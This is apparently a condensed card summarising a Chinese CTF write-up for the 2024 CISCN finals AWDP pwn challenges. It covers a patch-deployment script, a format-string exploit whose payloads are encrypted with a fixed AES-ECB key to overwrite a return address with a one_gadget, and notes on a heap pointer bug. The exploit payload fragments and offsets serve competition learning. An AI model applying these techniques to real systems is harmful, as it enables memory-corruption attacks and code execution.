---
title: "第十七届CISCN总决赛-AWDP-PWN部分题解"
category: pwn
tags: ["CISCN总决赛", "pwn", "AWDP赛制", "format-string", "heap-AWDP", "AES-ECB加密payload"]
signals: ["CISCN总决赛 2024", "AWDP赛制", "format-string", "heap-AWDP", "AES-ECB加密payload", "pwn_fix替换", "heap_exploit", "CISCN", "AWDP", "PWN2", "tar", "update", "pwn_fix", "chmod"]
difficulty: hard
source: "https://www.ctfiot.com/198770.html"
tools: []
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 第十七届CISCN总决赛-AWDP-PWN部分题解

> 赛事：CISCN总决赛 2024 | 方向：pwn | 难度：hard

## 一句话总结

第十七届CISCN总决赛AWDP PWN2题:tar update.tar.gz(update.sh+pwn_fix)替换赛题二进制+chmod+AWDP赛制攻防两用|pwn1格式化字符串+AES-ECB加密payload逐字节%hn写one_gadget(0xe3b01)|pwn2 heap_list[0xA080] shl idx,3+free+pop清指针

## 攻击链

1. AWDP赛制: tar zcvf update.tar.gz update.sh pwn_fix,update.sh中mv pwn_fix /home/ctf/pwn+chmod 777|pwn1: 格式化字符串+AES-ECB加密payload,''%6+6$p''泄stack+libc_base=''%6+9$p''-__libc_start_main-243+逐字节fmt写stack_ret=stack-232为libc_base+0xe3b01 one_gadget+8字节rop|pwn2: heap列表[0xA080] shl idx,3; push; mov rdi,[rdx]; call free; pop rdx; mov [rdx],rdi 清理指针

## 关键 payload

```
mv pwn_fix /home/ctf/pwn + chmod 777|pay = f"%{6+6}$p" → stack|libc_base = int(ru(''!''),16) - libc.sym[''__libc_start_main''] - 243|stack_ret = stack - 232|ogg = 0xe3b01; rop = p64(libc_base + ogg)|for i in range(len(rop)): pay = f"%{(stack_ret + i) & 0xFFFF}c%{6+0xb}$hn\x00" + sendpay(pay)|AES.new(key=7BF35CD69C475D5E6F1D7A23187BF934, AES.MODE_ECB) encrypt(_pad(pay))
```

## 经验教训

1) AWDP攻防:tar打包update.sh+修复pwn二进制+chmod 777+远程解压覆盖/启动服务; 2) fmt + AES-ECB加密payload:key固定7BF35CD69C475D5E6F1D7A23187BF934,ECB模式无IV,每条payload需_pad到16倍数; 3) fmt逐字节写:%{(stack_ret+i)&0xFFFF}c%{6+0xb}$hn写addr低2字节 + %19c%{6+0x27}$hn写值; 4) 一次性one_gadget:libc_base+0xe3b01 8字节覆盖返回地址; 5) heap_list漏洞:[idx*8+0xA080]取出指针调free,ret后rdi空+pop清[rdx]=rdi

## 标签

AWDP赛制、format-string、heap-AWDP、AES-ECB加密payload、pwn_fix替换

## 参考来源

- https://www.ctfiot.com/198770.html
- 原文件：第十七届CISCN总决赛-AWDP-PWN部分题解.full.md
